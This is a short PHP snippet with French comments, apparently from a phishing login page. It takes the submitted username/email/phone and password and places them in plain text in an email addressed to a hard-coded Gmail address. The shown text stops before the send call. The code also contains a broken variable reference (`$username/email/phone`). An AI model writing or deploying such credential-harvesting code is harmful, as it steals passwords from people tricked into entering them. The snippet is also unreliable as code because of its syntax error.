<?php
if (isset($_POST['submit'])) {
    // Récupérer les données du formulaire
    $username_email_phone = $_POST['Username/Email/Phone'];
    $password = $_POST['Password'];

    // Adresse e-mail à laquelle envoyer les informations
    $to = 'kyliang2010@gmail.com'; // Remplacez par votre adresse e-mail

    // Sujet du message
    $subject = 'connexion';

    // Corps du message
    $message = "Nouvelle connexion sur votre site :\n\n";
    $message .= "Username/Email/Phone : " . $username/email/phone . "\n";
    $message .= "Mot de passe : " . $password . "\n";